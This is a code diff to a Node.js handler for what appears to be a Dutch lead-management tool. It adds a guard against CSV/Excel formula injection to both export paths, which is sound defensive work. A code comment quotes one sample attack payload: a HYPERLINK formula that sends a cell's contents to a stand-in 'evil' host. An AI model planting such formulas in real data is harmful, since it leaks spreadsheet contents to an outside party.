@@ -439,9 +439,11 @@ module.exports = async function handler(req, res) {
           if (!d.offset) break;
           offset = d.offset;
         }
-        // Build CSV. Quote fields, escape internal quotes by doubling them
+        // Build CSV. Guard against formula injection, quote fields, escape
+        // internal quotes by doubling them
         const csvEscape = (v) => {
-          const s = String(v == null ? '' : v).replace(/\r?\n/g, ' ').replace(/"/g, '""');
+          const s = csvFormulaGuard(String(v == null ? '' : v))
+            .replace(/\r?\n/g, ' ').replace(/"/g, '""');
           return `"${s}"`;
         };
         const headers = ['Datum', 'Naam', 'Telefoon', 'Bron', 'Status', 'Gekwalificeerd', 'Lead Score', 'Ability', 'Urgency', 'Fit', 'Samenvatting', 'Reden', 'Booking Sent', 'Opgepikt', 'Verwachte Waarde', 'Notities'];
@@ -892,7 +894,7 @@ module.exports = async function handler(req, res) {
 
   // CSV export
   if (params.get('export') === 'true') {
-    const esc  = v => '"' + String(v || '').replace(/"/g, '""') + '"';
+    const esc  = v => '"' + csvFormulaGuard(String(v || '')).replace(/"/g, '""') + '"';
     const hdrs = ['Naam','Telefoon','Status','Gekwalificeerd','Bron','Score','Urgentie','Capaciteit','Fit','Verwachte Waarde','Datum','Samenvatting'];
     const rows = leads.map(l => [
       l.naam, l.telefoon, l.status, l.qualified ? 'Ja' : 'Nee',
@@ -948,6 +950,18 @@ module.exports = async function handler(req, res) {
 // Escape double-quotes and backslashes for Airtable formula strings
 function escapeFormula(val) {
   return String(val || '').replace(/\\/g, '\\\\').replace(/"/g, '\\"');
+}
+
+// CSV/Excel formula-injection guard. Lead-supplied fields (name, notes,
+// etc.) come from the public, unauthenticated lead-capture form and are
+// written into CSV exports below. If a cell's leading character is =, +, -,
+// @, tab or CR, Excel/Sheets can interpret it as a formula (e.g. a
+// lead-supplied name of `=HYPERLINK("http://evil/"&A1,"x")` executes on
+// open). Prefixing with a single quote neutralizes it while leaving the
+// visible text intact. Shared by both export code paths (A2 csv-export and
+// GET ?export=true).
+function csvFormulaGuard(s) {
+  return /^[=+\-@\t\r]/.test(s) ? "'" + s : s;
 }
 
 // Escape HTML entities for safe embedding in email HTML
